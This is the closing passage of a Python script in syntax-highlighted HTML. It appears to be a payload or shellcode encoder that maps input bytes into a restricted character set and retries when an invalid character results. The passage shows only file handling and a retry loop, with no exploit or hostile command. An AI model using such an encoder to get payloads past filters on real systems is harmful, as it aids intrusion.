style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#3ad900;font-weight:400">'rb'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input_bytes&nbsp;=&nbsp;f.read()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[*]&nbsp;Input&nbsp;buffer&nbsp;size:&nbsp;%d&nbsp;bytes.'</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(input_bytes))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;success&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;i&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">try</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;=&nbsp;process(input_bytes,&nbsp;prepend_init)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;out:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;display_output(out)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">'-'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">with</span>&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(sys.argv[<span style="color:#ff0044;font-weight:400">2</span>],&nbsp;<span style="color:#3ad900;font-weight:400">'wb'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(out)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[?]&nbsp;Returned&nbsp;empty&nbsp;payload.&nbsp;Confused...'</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">except</span>&nbsp;InvalidCharResulted&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;pr:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[!]&nbsp;Inter-bytes&nbsp;difference&nbsp;resulted&nbsp;too&nbsp;big&nbsp;rendering&nbsp;invalid&nbsp;char&nbsp;(%x,&nbsp;"%c").&nbsp;Restarting...'</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">ord</span>(<span style="color:#ff9d00;font-weight:700">str</span>(pr)),&nbsp;<span style="color:#ff9d00;font-weight:700">str</span>(pr))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">continue</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;success:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[!]&nbsp;PROGRAM&nbsp;FAILURE.'</span><br /><br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#333333;font-weight:400">__name__</span>&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'__main__'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;main()<br /></div></div></div></body></html>